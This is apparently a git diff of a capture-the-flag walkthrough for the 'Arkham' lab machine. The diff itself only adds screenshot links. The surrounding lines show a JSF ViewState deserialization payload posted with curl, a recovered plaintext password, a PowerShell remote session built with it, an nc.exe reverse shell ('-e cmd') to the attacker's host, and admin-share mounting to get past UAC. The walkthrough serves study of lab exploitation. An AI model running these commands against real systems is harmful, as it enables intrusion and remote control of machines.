@@ -112,7 +112,7 @@ https://myfaces.apache.org/core20/myfaces-impl-shared/xref/org/apache/myfaces/sh
 DES is the default encryption algo, with ECB mode and PAD_PKCS5 as padding.
 Mac algo is HMAC SHA1( 20 bytes length).
 
-![doc]()
+![doc](https://github.com/roughiz/Arkham-walktrough/blob/master/jsfdoc.png)
 
 With all theses informations i write a  python viestate algo of encryption and decryption.
 
@@ -177,7 +177,7 @@ To encode special caracters to url format :
 ```
 $  echo $(python viewstate.py -a encrypt )  | sed -f /usr/lib/ddns/url_escape.sed
 ```
-![ping]()
+![ping](https://github.com/roughiz/Arkham-walktrough/blob/master/ping.png)
 
 I used curl to post the viewstate payload manually.
 The idea here is to find the way to uplaod nc.exe and execute it. we have to know if the box has powershell or python etc ..
@@ -200,7 +200,7 @@ $ data=$(python viewstate.py -a encrypt    | sed -f /usr/lib/ddns/url_escape.sed
 
 $ curl -i -s -k  -X $'POST' -H $'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0' -H $'Referer: http://10.10.10.130:8080/userSubscribe.faces' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Upgrade-Insecure-Requests: 1' -b $'JSESSIONID=JSESSIONID='  --data-binary $'j_id_jsp_1623871077_1%3Aemail=balol%40gmail.com&j_id_jsp_1623871077_1%3Asubmit=SIGN+UP&j_id_jsp_1623871077_1_SUBMIT=1&javax.faces.ViewState='$data $'http://10.10.10.130:8080/userSubscribe.faces'
 ```
-![user shell]()
+![user shell](https://github.com/roughiz/Arkham-walktrough/blob/master/usershell.png)
 ## Privilege Escalation
 
 After digging in the machine, i found a zip file with an ".ost" file which is an outlook email folder, first we have to convert it to pst :
@@ -219,14 +219,14 @@ $ cat img | sed 's/ //g' | base64 -d > img.png
 
 The image contains a shell screen of how alfred mount G: drive with credentilas of batman, so lets use this password to run a command as Batman.
 The password for batan is "Zx^#QZX+T!123"
-![image]()
+![image](https://github.com/roughiz/Arkham-walktrough/blob/master/imagefromemail.png)
 
 With some enumerations, batman is a member of "remote manager" and "administrators" group.
 
 ```
 Local Group Memberships      *Administrators       *Remote Management Use
 ```
-![groups member]()
+![groups member](https://github.com/roughiz/Arkham-walktrough/blob/master/batmangroup.png)
 And this group members can access WMI, like you can see below:
 ```
 net localgroup "Remote Management Users"
@@ -282,14 +282,14 @@ In my case i did :
 ```
 $username = 'batman';$password = 'Zx^#QZX+T!123';$securePassword = ConvertTo-SecureString $password -AsPlainText -Force;$credential = New-Object System.Management.Automation.PSCredential $username,$securePassword;Enter-PSSession -ComputerName arkham -Credential $credential;
 ```
-![first_session]()
+![first_session](https://github.com/roughiz/Arkham-walktrough/blob/master/batmansession.png)
 
 Now i have a session shell but it's a very limited session due to  UAC, the idea is to obtain an other shell with nc.exe. So lets found a folder which Batman have access. i used  icacls (dir and cd  dosen't work with uac rules).
 Batman have access to 'C:\tomcat\apache-tomcat-8.5.37\bin\'   so i use nc.exe from it like :
 ```
 > C:\tomcat\apache-tomcat-8.5.37\bin\nc.exe 10.10.14.7 80 -e cmd
 ```
-![second_session]()
+![second_session](https://github.com/roughiz/Arkham-walktrough/blob/master/batmannewsession.png)
 Now we have an other shell, but i can't read the flag in administrator directory, due to UAC restriction, so here we have two solutions:
 
 ####### 1) Bypass UAC with a script ... but this version of windows is new and all uac bypass scripts founded dosen't work.
@@ -305,4 +305,4 @@ Or mount a drive like :
 $ net use r: \\arkham\c$ 
 $ r:
 ```
-![root_dance]()
+![root_dance](https://github.com/roughiz/Arkham-walktrough/blob/master/pushed.png)
